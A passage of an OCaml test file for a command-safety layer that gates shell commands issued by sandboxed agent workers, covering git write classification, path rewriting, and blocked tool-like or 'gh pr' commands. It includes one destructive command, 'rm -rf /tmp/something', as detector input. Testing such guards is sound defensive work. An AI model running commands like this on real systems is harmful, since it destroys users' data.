  let is_destructive = Masc_mcp.Worker_dev_tools.is_destructive_bash_operation in
  (* git checkout: branch switch, allowed in playground *)
  Alcotest.(check bool) "checkout is branch switch"
    true (is_branch_switch "git checkout -b my-feature");
  Alcotest.(check bool) "switch is branch switch"
    true (is_branch_switch "git switch -c my-feature");
  (* git push: write op, allowed in playground *)
  Alcotest.(check bool) "push is write" true (is_write "git push origin my-branch");
  Alcotest.(check bool) "commit is write" true (is_write "git commit -m 'msg'");
  (* destructive: blocked everywhere including playground *)
  Alcotest.(check bool) "rm -rf is destructive"
    true (is_destructive "rm -rf /tmp/something");
  (* git push is NOT destructive (it's write, not destructive) *)
  Alcotest.(check bool) "push is not destructive"
    false (is_destructive "git push origin my-branch")

let test_rewrite_turn_runtime_paths_to_host () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  let meta = make_docker_meta "minjae" in
  let container_root = Keeper_sandbox.container_root meta.name in
  let host_root =
    Keeper_sandbox.host_root_abs_of_meta ~config meta
    |> Masc_mcp.Keeper_alerting_path.strip_trailing_slashes
  in
  let input =
    Printf.sprintf "worktree %s/repos/masc-mcp\npwd=%s/repos/masc-mcp\n"
      container_root container_root
  in
  let rewritten =
    Keeper_exec_shell.rewrite_turn_runtime_paths_to_host ~config ~meta input
  in
  Alcotest.(check string) "container paths rewritten to host root"
    (Printf.sprintf "worktree %s/repos/masc-mcp\npwd=%s/repos/masc-mcp\n"
       host_root host_root)
    rewritten

let test_rewrite_turn_runtime_paths_to_host_is_noop_without_container_path () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  let meta = make_docker_meta "minjae" in
  let input = "worktree /tmp/other\n" in
  Alcotest.(check string) "unrelated paths untouched" input
    (Keeper_exec_shell.rewrite_turn_runtime_paths_to_host ~config ~meta input)

let test_rewrite_docker_host_paths_to_container () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  let meta = make_docker_meta "minjae" in
  let host_root =
    Keeper_sandbox.host_root_abs_of_meta ~config meta
    |> Masc_mcp.Keeper_alerting_path.strip_trailing_slashes
  in
  let container_root = Keeper_sandbox.container_root meta.name in
  let input =
    Printf.sprintf "cd %s/repos/masc-mcp && test -d %s2\n"
      host_root host_root
  in
  let rewritten =
    Keeper_exec_shell.rewrite_docker_host_paths_to_container
      ~config ~meta input
  in
  Alcotest.(check string) "host root rewritten only on path boundary"
    (Printf.sprintf "cd %s/repos/masc-mcp && test -d %s2\n"
       container_root host_root)
    rewritten

let test_rewrite_docker_container_paths_for_host_validation () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  let meta = make_docker_meta "minjae" in
  let host_root =
    Keeper_sandbox.host_root_abs_of_meta ~config meta
    |> Masc_mcp.Keeper_alerting_path.strip_trailing_slashes
  in
  let host_repo = Filename.concat (Filename.concat host_root "repos") "masc-mcp" in
  let container_root = Keeper_sandbox.container_root meta.name in
  let input =
    Printf.sprintf "cd %s/repos/masc-mcp && git log --oneline -5\n" container_root
  in
  Alcotest.(check bool) "raw container path is outside host workdir" true
    (is_error (Masc_mcp.Worker_dev_tools.validate_command_paths ~workdir:host_repo input));
  let rewritten =
    Keeper_shell_docker.rewrite_docker_command_paths_for_host_validation
      ~config ~meta input
  in
  Alcotest.(check string) "container root rewritten to host root for validation"
    (Printf.sprintf "cd %s/repos/masc-mcp && git log --oneline -5\n" host_root)
    rewritten;
  Alcotest.(check bool) "rewritten path validates under host workdir" true
    (is_ok
       (Masc_mcp.Worker_dev_tools.validate_command_paths ~workdir:host_repo rewritten))

(* ── Negative / error-path tests (task-034) ──────────────────────── *)

let test_bash_missing_cmd_field () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_docker_meta "missing-cmd" in
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:(`Assoc [ ("run_in_background", `Bool false) ]) ()
  in
  match parse_error_field raw with
  | Some err ->
      Alcotest.(check bool) "error mentions cmd is required" true
        (String_util.contains_substring err "cmd is required")
  | None ->
      Alcotest.fail ("expected error json for missing cmd field, got: " ^ raw)

let test_bash_blocks_direct_masc_tool_command () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_docker_meta "direct-tool-command" in
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:(`Assoc [ ("cmd", `String "keeper_tasks_list") ]) ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check (option string))
    "error"
    (Some "tool_invoked_as_shell_command")
    (Json.member "error" json |> Json.to_string_option);
  Alcotest.(check (option string))
    "failure class"
    (Some "workflow_rejection")
    (Json.member "failure_class" json |> Json.to_string_option);
  Alcotest.(check (option string))
    "suggested tool"
    (Some "keeper_tasks_list")
    (Json.member "suggested_tool" json |> Json.to_string_option);
  Alcotest.(check bool)
    "hint says direct tool call"
    true
    (String_util.contains_substring
       (Json.member "hint" json |> Json.to_string)
       "keeper_tasks_list tool");
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:(`Assoc [ ("cmd", `String "keeper_missing_from_policy") ]) ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check (option string))
    "tool-like command error"
    (Some "tool_invoked_as_shell_command")
    (Json.member "error" json |> Json.to_string_option);
  Alcotest.(check bool)
    "non-visible tool-like command still blocked"
    false
    (Json.member "tool_policy_visible" json |> Json.to_bool)

let test_bash_blocks_gh_pr_list_with_native_pr_hint () =
  with_eio_fs @@ fun () ->
  Alcotest.(check bool)
    "prose is not a native PR command"
    true
    (Option.is_none
       (Keeper_shell_words.cmd_gh_pr_native_subcommand "echo gh pr list"));
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_docker_meta "gh-pr-list-native-hint" in
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ( "cmd"
             , `String
                 "gh pr list --repo jeong-sik/masc-mcp --state open --limit 10"
             )
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  let diagnosis = Json.member "diagnosis" json in
  Alcotest.(check (option string))
    "error"
    (Some "command_blocked")
    (Json.member "error" json |> Json.to_string_option);
  Alcotest.(check (option string))
    "rule id"
    (Some "gh_pr_list_requires_keeper_pr_list")
    (Json.member "rule_id" diagnosis |> Json.to_string_option);
  Alcotest.(check (option string))
    "tool suggestion"
    (Some "keeper_pr_list")
    (Json.member "tool_suggestion" diagnosis |> Json.to_string_option);
  Alcotest.(check bool)
    "hint names native PR list tool"
    true
    (String_util.contains_substring
       (Json.member "hint" json |> Json.to_string)
       "keeper_pr_list")

let test_shell_missing_op_field () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "missing-op" in
  let raw =
    Keeper_exec_shell.handle_keeper_shell
      ~turn_sandbox_factory:None ~exec_cache:None
      ~config ~meta
      ~args:(`Assoc [ ("path", `String "/some/path") ])
  in
  match parse_error_field raw with
  | Some err ->
      Alcotest.(check bool) "error mentions unsupported op" true
        (String_util.contains_substring err "unsupported_op")
  | None ->
      Alcotest.fail ("expected error json for missing op field, got: " ^ raw)

let test_shell_unsupported_op () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "bad-op" in
  let raw =
    Keeper_exec_shell.handle_keeper_shell
      ~turn_sandbox_factory:None ~exec_cache:None
      ~config ~meta
      ~args:(`Assoc [
        ("op", `String "definitely_not_a_real_op");
        ("path", `String "/some/path");
      ])
  in
  match parse_error_field raw with
  | Some err ->
      Alcotest.(check bool) "error mentions unsupported op" true
        (String_util.contains_substring err "unsupported_op")
  | None ->
      Alcotest.fail ("expected error json for unsupported op, got: " ^ raw)

let () =
  Alcotest.run "Keeper bash safety" [
    ("allowlist", [
      Alcotest.test_case "allowed dev commands pass" `Quick test_allowed_commands;
      Alcotest.test_case "dangerous commands blocked" `Quick test_blocked_commands;
    ]);
    ("metachar", [
      Alcotest.test_case "shell metacharacters blocked" `Quick test_shell_metachar_blocked;
    ]);
    ("write_gate", [
      Alcotest.test_case "write operations detected" `Quick test_write_ops_detected;
      Alcotest.test_case "read operations pass" `Quick test_read_ops_pass;
    ]);
    ("playground_guard", [
      Alcotest.test_case "playground path structure" `Quick test_playground_path_structure;
      Alcotest.test_case "inside playground detected" `Quick test_playground_guard_inside;
      Alcotest.test_case "outside playground rejected" `Quick test_playground_guard_outside;
      Alcotest.test_case "trailing slash normalized" `Quick test_playground_guard_trailing_slash;
      Alcotest.test_case "symlink escape rejected" `Quick test_playground_guard_symlink_escape;
      Alcotest.test_case "cleanup does not follow symlinks" `Quick
        test_cleanup_dir_does_not_follow_symlinks;
      Alcotest.test_case "path traversal blocked after canonicalization" `Quick test_playground_guard_traversal;
      Alcotest.test_case "git write classification" `Quick test_git_write_classification;
    ]);
    ("edge", [
      Alcotest.test_case "elapsed duration preserves positive sub-ms" `Quick
        test_keeper_bash_elapsed_duration_preserves_positive_sub_ms;
      Alcotest.test_case "keeper_bash timeout floor avoids 1s I/O failures" `Quick
        test_keeper_bash_timeout_floor_is_not_sub_io_latency;
      Alcotest.test_case "shape guard parses quoted metachar literals" `Quick
        test_keeper_bash_shape_uses_shell_ir_for_quoted_literals;
      Alcotest.test_case "Shell IR parse-failure shape fallback is quote-aware"
        `Quick
        test_keeper_bash_shell_ir_parse_failure_shape_fallback_is_quote_aware;
      Alcotest.test_case "stderr devnull strip preserves post-background redirect"
        `Quick
        test_stderr_dev_null_strip_preserves_post_background_redirect;
      Alcotest.test_case "task-state shell paths get task-tool hint" `Quick
        test_keeper_bash_task_state_hint_uses_task_tools;
      Alcotest.test_case "task-state discovery gets task-tool hint" `Quick
        test_keeper_bash_task_state_discovery_hint_uses_task_tools;
      Alcotest.test_case "repo-wide scans blocked" `Quick
        test_keeper_bash_blocks_repo_wide_scans;
      Alcotest.test_case "repo-wide scan hints use structured tools" `Quick
        test_keeper_bash_repo_wide_scan_hints_use_structured_tools;
      Alcotest.test_case "repo-wide recovery plans carry native args" `Quick
        test_keeper_bash_repo_wide_recovery_plan_carries_native_args;
      Alcotest.test_case "empty command blocked" `Quick test_empty_command;
      Alcotest.test_case "docker blocks nested docker command" `Quick
        test_docker_blocks_nested_docker_command;
      Alcotest.test_case "docker blocks docker socket reference" `Quick
        test_docker_blocks_docker_socket_reference;
      Alcotest.test_case "nested runtime detector ignores commit messages" `Quick
        test_nested_runtime_detector_ignores_git_commit_message;
      Alcotest.test_case "command substitution trips docker guard" `Quick
        test_docker_nested_guard_blocks_command_substitution;
      Alcotest.test_case "path-prefixed runtime trips docker guard" `Quick
        test_docker_nested_guard_blocks_path_prefixed_runtime;
      Alcotest.test_case "docker blocks raw gh pr create" `Quick
        test_docker_blocks_raw_gh_pr_create;
      Alcotest.test_case "docker blocks chained gh pr create" `Quick
        test_docker_blocks_chained_gh_pr_create;
      Alcotest.test_case "docker blocks newline gh pr create" `Quick
        test_docker_blocks_newline_gh_pr_create;
      Alcotest.test_case "docker blocks env-wrapped gh pr create" `Quick
        test_docker_blocks_env_wrapped_gh_pr_create;
      Alcotest.test_case "docker blocks command-wrapped gh pr create" `Quick
        test_docker_blocks_command_wrapped_gh_pr_create;
      Alcotest.test_case "docker allows gh pr create prose" `Quick
        test_docker_allows_gh_pr_create_prose;
      Alcotest.test_case "docker missing seccomp fails closed" `Quick
        test_docker_missing_seccomp_profile_fails_closed;
    ]);
    ("typed_shell_ir", [
      Alcotest.test_case "typed exec runs via Shell IR" `Quick
        test_keeper_bash_typed_exec_runs_via_shell_ir;
      Alcotest.test_case "typed pipeline runs via Shell IR" `Quick
        test_keeper_bash_typed_pipeline_runs_via_shell_ir;
      Alcotest.test_case "typed docker dispatch requires factory" `Quick
        test_keeper_bash_typed_docker_requires_factory;
    ]);
    ("readonly_hints", [
      Alcotest.test_case "safe dev-null echo fallback executes primary" `Quick
        test_keeper_bash_safe_dev_null_echo_fallback_executes_primary;
      Alcotest.test_case "safe dev-null redirect executes scoped ls" `Quick
        test_keeper_bash_safe_dev_null_redirect_executes_scoped_ls;
      Alcotest.test_case "safe fallback works for write-enabled keeper" `Quick
        test_keeper_bash_safe_fallback_works_for_write_enabled_keeper;
      Alcotest.test_case "safe cd fallback executes scoped read" `Quick
        test_keeper_bash_safe_cd_fallback_executes_scoped_read;
      Alcotest.test_case "single repo root recovers top-level find" `Quick
        test_keeper_bash_single_repo_root_recovers_top_level_find;
      Alcotest.test_case "double repo prefix gets public Bash recovery plan" `Quick
        test_keeper_bash_blocks_doubled_repo_prefix_with_public_alias_plan;
      Alcotest.test_case "safe rg fallback allows escaped regex pipe" `Quick
        test_keeper_bash_safe_rg_fallback_allows_escaped_regex_pipe;
      Alcotest.test_case "safe dev-null redirect executes scoped grep" `Quick
        test_keeper_bash_safe_dev_null_redirect_executes_scoped_grep;
      Alcotest.test_case "safe head pipeline executes scoped cat" `Quick
        test_keeper_bash_safe_head_pipeline_executes_scoped_cat;
      Alcotest.test_case "cat /dev/null executes" `Quick
        test_keeper_bash_cat_dev_null_executes;
      Alcotest.test_case "task-state file probe uses task tools" `Quick
        test_keeper_bash_task_state_file_probe_uses_task_tools;
      Alcotest.test_case "unrelated .task.json is normal file" `Quick
        test_keeper_bash_unrelated_task_json_is_not_task_state_probe;
      Alcotest.test_case "unrelated current_task.json is normal file" `Quick
        test_keeper_bash_unrelated_current_task_json_is_not_task_state_probe;
      Alcotest.test_case "safe fallback does not unblock repo scan" `Quick
        test_keeper_bash_safe_fallback_does_not_unblock_repo_scan;
      Alcotest.test_case "task-state localhost probe uses task tools" `Quick
        test_keeper_bash_task_state_http_probe_uses_task_tools;
      Alcotest.test_case "echo task API URL is normal output" `Quick
        test_keeper_bash_echo_task_api_url_is_not_http_probe;
      Alcotest.test_case "safe head pipeline executes cd-scoped grep" `Quick
        test_keeper_bash_safe_head_pipeline_executes_cd_scoped_grep;
      Alcotest.test_case "safe head pipeline executes scoped find" `Quick
        test_keeper_bash_safe_head_pipeline_executes_scoped_find;
      Alcotest.test_case "find accepts name alias" `Quick
        test_keeper_shell_find_accepts_name_alias;
      Alcotest.test_case "doubled playground prefix auto-recovers" `Quick
        test_keeper_shell_ls_recovers_doubled_playground_prefix;
      Alcotest.test_case "op=bash is deprecated" `Quick
        test_keeper_shell_bash_op_is_deprecated;
      Alcotest.test_case "op=bash does not execute" `Quick
        test_keeper_shell_bash_op_does_not_execute;
    ]);
    ("rg_exit_code", [
      Alcotest.test_case "rg exit semantics (0=ok, 1=ok, 2+=error)" `Quick test_rg_exit_code_semantics;
    ]);
    ("git_worktree_op", [
      Alcotest.test_case "action normalization" `Quick test_git_worktree_action_normalization;
      Alcotest.test_case "branch required for add" `Quick test_git_worktree_branch_required;
    ]);
    ("turn_runtime_paths", [
      Alcotest.test_case "container paths rewrite to host paths" `Quick
        test_rewrite_turn_runtime_paths_to_host;
      Alcotest.test_case "unrelated paths remain unchanged" `Quick
        test_rewrite_turn_runtime_paths_to_host_is_noop_without_container_path;
      Alcotest.test_case "docker commands rewrite host paths to container paths" `Quick
        test_rewrite_docker_host_paths_to_container;
      Alcotest.test_case "docker container paths validate as host paths" `Quick
        test_rewrite_docker_container_paths_for_host_validation;
    ]);
    ("negative_path", [
      Alcotest.test_case "missing cmd field" `Quick test_bash_missing_cmd_field;
      Alcotest.test_case "direct MASC tool command blocked" `Quick
        test_bash_blocks_direct_masc_tool_command;
      Alcotest.test_case "raw gh pr list suggests keeper_pr_list" `Quick
        test_bash_blocks_gh_pr_list_with_native_pr_hint;
      Alcotest.test_case "missing op field" `Quick test_shell_missing_op_field;
      Alcotest.test_case "unsupported op" `Quick test_shell_unsupported_op;
    ]);
  ]
